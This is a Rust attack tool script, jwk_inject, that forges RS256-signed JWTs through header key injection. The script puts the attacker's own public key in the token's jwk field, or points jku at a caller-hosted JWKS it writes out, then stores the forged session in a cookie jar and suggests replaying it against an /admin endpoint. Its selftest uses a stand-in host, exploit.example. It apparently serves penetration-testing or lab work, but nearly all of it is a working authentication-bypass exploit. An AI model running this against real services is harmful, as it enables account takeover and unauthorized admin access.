#!/usr/bin/env rust-script
//! name: jwk_inject
//! description: JWT 头密钥注入签发件 - 生成或载入 RSA 私钥并用 RS256 签名(sub/iss/kid 可控),两种头形态:默认把公钥以 jwk 字段内嵌进头(服务端信任 token 自带验签密钥),--jku URL 改为头的 jku 指向 caller 托管的 JWKS 并同时输出该 JWKS JSON(--jwks-out,公钥集,服务端不校验 jku 域名时即命中);token 直接写入 http_session 兼容 cookie jar,--selftest 本地复验签名。
//! version: 1.1.1
//! args: --host HOST [--sub user] [--jar FILE] [--cookie session] [--out TOKEN] [--key-in PEM] [--key-out PEM] [--kid K | --no-kid] [--typ T] [--no-jwk-kid] [--jku URL] [--jwks-out FILE] [--iss issuer] [--bits 2048] [--exp N] [--selftest]
//! keywords: jwt, jwk, jku, jwks, rs256, header-injection, auth-bypass, rsa, forge, cookie-jar
//!
//! ```cargo
//! [dependencies]
//! rsa = "0.9"
//! rand = "0.8"
//! sha2 = { version = "0.10", features = ["oid"] }
//! base64 = "0.22"
//! ```

use base64::engine::general_purpose::URL_SAFE_NO_PAD;
use base64::Engine;
use pi_rust_lib::serde_json::{self, json, Map, Value};
use rsa::pkcs1::{DecodeRsaPrivateKey, EncodeRsaPrivateKey, LineEnding};
use rsa::pkcs1v15::{Signature, SigningKey, VerifyingKey};
use rsa::signature::{SignatureEncoding, Signer, Verifier};
use rsa::traits::PublicKeyParts;
use rsa::{RsaPrivateKey, RsaPublicKey};
use sha2::Sha256;

const USAGE: &str = "jwk_inject --host HOST [--sub user] [--jar FILE] [--cookie session] [--out TOKEN] [--key-in PEM] [--key-out PEM] [--kid K] [--iss issuer] [--bits 2048] [--exp N]";

fn main() {
    let args: Vec<String> = std::env::args().skip(1).collect();
    if args.iter().any(|a| a == "--selftest") {
        selftest();
        return;
    }
    let mut host = String::new();
    let mut sub = "user".to_string();
    let mut iss = "issuer".to_string();
    let mut kid = String::new();
    let mut jar = String::new();
    let mut cookie = "session".to_string();
    let mut out = String::new();
    let mut key_in = String::new();
    let mut key_out = String::new();
    let mut no_kid = false;
    let mut typ = String::new();
    let mut jwk_kid = true;
    let mut bits: usize = 2048;
    let mut exp: i64 = 9999999999;
    let mut jku = String::new();
    let mut jwks_out = String::new();

    let mut i = 0;
    while i < args.len() {
        let val = |i: usize| args.get(i + 1).cloned().unwrap_or_default();
        match args[i].as_str() {
            "--host" => { host = val(i); i += 2; }
            "--sub" => { sub = val(i); i += 2; }
            "--iss" => { iss = val(i); i += 2; }
            "--kid" => { kid = val(i); i += 2; }
            "--jar" => { jar = val(i); i += 2; }
            "--cookie" => { cookie = val(i); i += 2; }
            "--out" => { out = val(i); i += 2; }
            "--key-in" => { key_in = val(i); i += 2; }
            "--key-out" => { key_out = val(i); i += 2; }
            "--no-kid" => { no_kid = true; i += 1; }
            "--typ" => { typ = val(i); i += 2; }
            "--jwk-kid" => { jwk_kid = true; i += 1; }
            "--no-jwk-kid" => { jwk_kid = false; i += 1; }
            "--jku" => { jku = val(i); i += 2; }
            "--jwks-out" => { jwks_out = val(i); i += 2; }
            "--bits" => { bits = val(i).parse().unwrap_or(2048); i += 2; }
            "--exp" => { exp = val(i).parse().unwrap_or(exp); i += 2; }
            _ => i += 1,
        }
    }

    if host.is_empty() {
        pi_rust_lib::report::failure("jwk_inject", "missing --host", USAGE);
        std::process::exit(2);
    }
    let host = host.trim_start_matches("https://").trim_start_matches("http://").trim_end_matches('/').to_string();

    let sk = match load_or_generate(&key_in, bits) {
        Ok(k) => k,
        Err(e) => {
            pi_rust_lib::report::failure("jwk_inject", &e, "check --key-in/--bits");
            std::process::exit(1);
        }
    };
    let pk = RsaPublicKey::from(&sk);
    let n = URL_SAFE_NO_PAD.encode(sk.n().to_bytes_be());
    let e = URL_SAFE_NO_PAD.encode(sk.e().to_bytes_be());
    if key_out.is_empty() == false {
        match sk.to_pkcs1_pem(LineEnding::LF) {
            Ok(pem) => {
                if let Err(err) = std::fs::write(&key_out, pem.as_str()) {
                    pi_rust_lib::report::failure("jwk_inject", &format!("write {key_out}: {err}"), "pick a writable --key-out");
                    std::process::exit(1);
                }
            }
            Err(err) => {
                pi_rust_lib::report::failure("jwk_inject", &format!("encode pem: {err}"), "cannot encode PKCS#1 PEM");
                std::process::exit(1);
            }
        }
    }

    if kid.is_empty() {
        // stable per-key id: first 8 bytes of SHA-256 over the modulus (matches the lab's uuid shape loosely, any value works)
        use sha2::Digest;
        let mut h = Sha256::new();
        h.update(sk.n().to_bytes_be());
        let d = h.finalize();
        kid = format!(
            "{:02x}{:02x}{:02x}{:02x}-{:02x}{:02x}-{:02x}{:02x}-{:02x}{:02x}-{:02x}{:02x}{:02x}{:02x}{:02x}{:02x}",
            d[0], d[1], d[2], d[3], d[4], d[5], d[6], d[7], d[8], d[9], d[10], d[11], d[12], d[13], d[14], d[15]
        );
    }

    // public JWKS for the --jku mode: the caller hosts this at the jku URL
    let jwks = {
        let mut k = Map::new();
        k.insert("kty".into(), json!("RSA"));
        k.insert("e".into(), json!(e));
        k.insert("n".into(), json!(n));
        if !no_kid {
            k.insert("kid".into(), json!(kid));
        }
        k.insert("alg".into(), json!("RS256"));
        k.insert("use".into(), json!("sig"));
        json!({ "keys": [Value::Object(k)] })
    };
    let jku_mode = !jku.is_empty();
    if jku_mode && !jwks_out.is_empty() {
        let body = serde_json::to_string(&jwks).expect("jwks");
        if let Err(err) = std::fs::write(&jwks_out, &body) {
            pi_rust_lib::report::failure("jwk_inject", &format!("write {jwks_out}: {err}"), "pick a writable --jwks-out");
            std::process::exit(1);
        }
    }
    let header = {
        let mut h = Map::new();
        if !no_kid {
            h.insert("kid".into(), json!(kid));
        }
        h.insert("alg".into(), json!("RS256"));
        if !typ.is_empty() {
            h.insert("typ".into(), json!(typ));
        }
        if jku_mode {
            h.insert("jku".into(), json!(jku));
        } else {
            let mut jwk = Map::new();
            jwk.insert("kty".into(), json!("RSA"));
            jwk.insert("e".into(), json!(e));
            jwk.insert("n".into(), json!(n));
            if jwk_kid {
                jwk.insert("kid".into(), json!(kid));
            }
            h.insert("jwk".into(), Value::Object(jwk));
        }
        Value::Object(h)
    };
    let payload = json!({"iss": iss, "exp": exp, "sub": sub});
    let message = format!(
        "{}.{}",
        URL_SAFE_NO_PAD.encode(serde_json::to_vec(&header).expect("header")),
        URL_SAFE_NO_PAD.encode(serde_json::to_vec(&payload).expect("payload"))
    );
    let signing_key = SigningKey::<Sha256>::new(sk.clone());
    let sig = signing_key.sign(message.as_bytes());
    let sig_b64 = URL_SAFE_NO_PAD.encode(sig.to_bytes());
    let token = format!("{message}.{sig_b64}");

    let mut jar_written: Value = Value::Null;
    if !jar.is_empty() {
        match update_jar(&jar, &host, &cookie, &token) {
            Ok(()) => jar_written = json!(jar),
            Err(err) => {
                pi_rust_lib::report::failure("jwk_inject", &err, "check the --jar path");
                std::process::exit(1);
            }
        }
    }
    if !out.is_empty() {
        if let Err(err) = std::fs::write(&out, &token) {
            pi_rust_lib::report::failure("jwk_inject", &format!("write {out}: {err}"), "pick a writable --out");
            std::process::exit(1);
        }
    }

    // local self-check: the same token must verify against the embedded public key
    let vk = VerifyingKey::<Sha256>::new(pk);
    let verified = match Signature::try_from(sig.to_bytes().as_ref()) {
        Ok(s) => vk.verify(message.as_bytes(), &s).is_ok(),
        Err(_) => false,
    };

    pi_rust_lib::report::success(
        "jwk_inject",
        json!({
            "host": host,
            "token": token,
            "token_len": token.len(),
            "sub": sub,
            "kid": if no_kid { Value::Null } else { json!(kid) },
            "mode": if jku_mode { "jku" } else { "jwk" },
            "jku": if jku_mode { json!(jku) } else { Value::Null },
            "jwks": if jku_mode { jwks.clone() } else { Value::Null },
            "jwks_out": if jwks_out.is_empty() { Value::Null } else { json!(jwks_out) },
            "jwk": {"kty": "RSA", "e": URL_SAFE_NO_PAD.encode(sk.e().to_bytes_be()), "n_len": sk.n().bits()},
            "signature_verified_locally": verified,
            "jar": jar_written,
            "cookie": cookie,
            "key_pem_out": if key_out.is_empty() { Value::Null } else { json!(key_out) },
            "out": if out.is_empty() { Value::Null } else { json!(out) },
        }),
        "replay with: http_session get https://<host>/admin --jar <jar> (the forged session is already stored)",
    )
    .expect("report");
}

fn load_or_generate(key_in: &str, bits: usize) -> Result<RsaPrivateKey, String> {
    if key_in.is_empty() {
        let mut rng = rand::thread_rng();
        RsaPrivateKey::new(&mut rng, bits).map_err(|e| format!("keygen: {e}"))
    } else {
        let pem = std::fs::read_to_string(key_in).map_err(|e| format!("read {key_in}: {e}"))?;
        RsaPrivateKey::from_pkcs1_pem(&pem).map_err(|e| format!("parse {key_in}: {e}"))
    }
}

fn update_jar(path: &str, host: &str, name: &str, value: &str) -> Result<(), String> {
    let mut root: Map<String, Value> = match std::fs::read_to_string(path) {
        Ok(text) if !text.trim().is_empty() => serde_json::from_str(&text).map_err(|e| format!("parse {path}: {e}"))?,
        _ => Map::new(),
    };
    let entry = root
        .entry(host.to_string())
        .or_insert_with(|| Value::Object(Map::new()));
    if !entry.is_object() {
        *entry = Value::Object(Map::new());
    }
    entry
        .as_object_mut()
        .expect("object")
        .insert(name.to_string(), json!(value));
    let text = serde_json::to_string(&Value::Object(root)).map_err(|e| e.to_string())?;
    std::fs::write(path, text).map_err(|e| format!("write {path}: {e}"))
}

fn selftest() {
    let mut rng = rand::thread_rng();
    let sk = RsaPrivateKey::new(&mut rng, 2048).expect("keygen");
    let pk = RsaPublicKey::from(&sk);
    let n = URL_SAFE_NO_PAD.encode(sk.n().to_bytes_be());
    let e = URL_SAFE_NO_PAD.encode(sk.e().to_bytes_be());
    let header = json!({"alg": "RS256", "typ": "JWT", "jwk": {"kty": "RSA", "n": n, "e": e}});
    let jku_header = json!({"alg": "RS256", "kid": "k1", "jku": "https://exploit.example/jwks.json"});
    let jwks = json!({"keys": [{"kty": "RSA", "n": n, "e": e, "kid": "k1", "alg": "RS256", "use": "sig"}]});
    let jwks_ok = jwks["keys"][0]["kid"] == json!("k1") && jwks["keys"][0]["n"].as_str().map(|s| s.len() > 100).unwrap_or(false);
    let payload = json!({"sub": "user", "exp": 9999999999i64});
    let message = format!(
        "{}.{}",
        URL_SAFE_NO_PAD.encode(serde_json::to_vec(&header).unwrap()),
        URL_SAFE_NO_PAD.encode(serde_json::to_vec(&payload).unwrap())
    );
    let sig = SigningKey::<Sha256>::new(sk).sign(message.as_bytes());
    let vk = VerifyingKey::<Sha256>::new(pk);
    let sig2 = Signature::try_from(sig.to_bytes().as_ref()).expect("sig parse");
    let ok = vk.verify(message.as_bytes(), &sig2).is_ok();
    let p = "/tmp/jwk_inject_selftest_jar.json";
    let _ = std::fs::remove_file(p);
    update_jar(p, "host.example", "session", "TOKEN").expect("jar write");
    let text = std::fs::read_to_string(p).expect("jar read");
    let jar_ok = text.contains("\"host.example\":{\"session\":\"TOKEN\"}");
    let _ = std::fs::remove_file(p);
    pi_rust_lib::report::success(
        "jwk_inject",
        json!({
            "signature_verify": ok,
            "jar_shape": jar_ok,
            "jwk_header_present": json!(header).to_string().contains("\"jwk\""),
            "jku_header_carries_jku": json!(jku_header).to_string().contains("jku") && !json!(jku_header).to_string().contains("\"jwk\""),
            "jwks_shape": jwks_ok
        }),
        "all true means RS256 + jwk header + jku header + JWKS + jar write are wired",
    )
    .expect("report");
}
